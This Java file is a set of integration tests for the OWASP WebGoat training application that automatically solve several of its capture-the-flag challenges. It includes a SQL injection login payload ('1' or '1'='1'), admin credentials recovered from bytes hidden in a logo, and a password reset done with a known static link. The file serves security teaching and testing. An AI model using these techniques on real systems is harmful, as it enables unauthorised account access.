/*
 * SPDX-FileCopyrightText: Copyright © 2022 WebGoat authors
 * SPDX-License-Identifier: GPL-2.0-or-later
 */
package org.owasp.webgoat.integration;

import io.restassured.RestAssured;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import org.assertj.core.api.Assertions;
import org.junit.jupiter.api.Test;
import org.springframework.http.HttpStatus;

public class ChallengeIntegrationTest extends IntegrationTest {

  private static final Pattern FLAG_PATTERN =
      Pattern.compile("\\b[0-9a-f]{8}-(?:[0-9a-f]{4}-){3}[0-9a-f]{12}\\b");

  @Test
  void testChallenge1() {
    startLesson("Challenge1");

    byte[] resultBytes =
        RestAssured.given()
            .when()
            .relaxedHTTPSValidation()
            .cookie("JSESSIONID", getWebGoatCookie())
            .get(webGoatUrlConfig.url("challenge/logo"))
            .then()
            .statusCode(200)
            .extract()
            .asByteArray();

    String pincode = new String(Arrays.copyOfRange(resultBytes, 81216, 81220));
    Map<String, Object> params = new HashMap<>();
    params.clear();
    params.put("username", "admin");
    params.put("password", "!!webgoat_admin_1234!!".replace("1234", pincode));

    checkAssignment(webGoatUrlConfig.url("challenge/1"), params, true);
    String result =
        RestAssured.given()
            .when()
            .relaxedHTTPSValidation()
            .cookie("JSESSIONID", getWebGoatCookie())
            .formParams(params)
            .post(webGoatUrlConfig.url("challenge/1"))
            .then()
            .statusCode(200)
            .extract()
            .asString();

    String flag = extractFlag(result);
    params.clear();
    params.put("flag", flag);
    checkAssignment(webGoatUrlConfig.url("challenge/flag/1"), params, true);

    checkResults("Challenge1");
  }

  @Test
  void testChallenge5() {
    startLesson("Challenge5");

    Map<String, Object> params = new HashMap<>();
    params.clear();
    params.put("username_login", "Larry");
    params.put("password_login", "1' or '1'='1");

    String result =
        RestAssured.given()
            .when()
            .relaxedHTTPSValidation()
            .cookie("JSESSIONID", getWebGoatCookie())
            .formParams(params)
            .post(webGoatUrlConfig.url("challenge/5"))
            .then()
            .statusCode(200)
            .extract()
            .asString();

    String flag = extractFlag(result);
    params.clear();
    params.put("flag", flag);
    checkAssignment(webGoatUrlConfig.url("challenge/flag/5"), params, true);

    checkResults("Challenge5");
  }

  @Test
  void testChallenge7() {
    startLesson("Challenge7");
    cleanMailbox();

    // One should first be able to download git.zip from WebGoat
    RestAssured.given()
        .when()
        .relaxedHTTPSValidation()
        .cookie("JSESSIONID", getWebGoatCookie())
        .get(webGoatUrlConfig.url("challenge/7/.git"))
        .then()
        .statusCode(200)
        .extract()
        .asString();

    // Should email WebWolf inbox this should give a hint to the link being static
    RestAssured.given()
        .when()
        .relaxedHTTPSValidation()
        .cookie("JSESSIONID", getWebGoatCookie())
        .formParams("email", getUser() + "@webgoat.org")
        .post(webGoatUrlConfig.url("challenge/7"))
        .then()
        .statusCode(200)
        .extract()
        .asString();

    // Check whether email has been received in the WebGoat mailbox
    var responseBody = readMailbox();
    Assertions.assertThat(responseBody).contains("Hi, you requested a password reset link");

    // Call reset link with admin link
    String result =
        RestAssured.given()
            .when()
            .relaxedHTTPSValidation()
            .cookie("JSESSIONID", getWebGoatCookie())
            .get(
                webGoatUrlConfig.url("challenge/7/reset-password/{link}"),
                "375afe1104f4a487a73823c50a9292a2")
            .then()
            .statusCode(HttpStatus.ACCEPTED.value())
            .extract()
            .asString();

    String flag = result.substring(result.indexOf("flag") + 6, result.indexOf("flag") + 42);
    checkAssignment(webGoatUrlConfig.url("challenge/flag/7"), Map.of("flag", flag), true);
  }

  @Test
  void testChallenge8() {
    startLesson("Challenge8");

    String flagHeader =
        RestAssured.given()
            .relaxedHTTPSValidation()
            .cookie("JSESSIONID", getWebGoatCookie())
            .head(webGoatUrlConfig.url("challenge/8/vote/5"))
            .then()
            .statusCode(200)
            .extract()
            .header("X-FlagController");

    Assertions.assertThat(flagHeader).startsWith("Thanks for voting, your flag is: ");
    String flag = flagHeader.substring(flagHeader.lastIndexOf(": ") + 2);
    checkAssignment(webGoatUrlConfig.url("challenge/flag/8"), Map.of("flag", "invalid"), false);
    checkAssignment(webGoatUrlConfig.url("challenge/flag/8"), Map.of("flag", flag), true);

    checkResults("Challenge8");
  }

  private String extractFlag(String result) {
    Matcher matcher = FLAG_PATTERN.matcher(result);
    Assertions.assertThat(matcher.find()).as("challenge response contains a flag").isTrue();
    return matcher.group();
  }
}
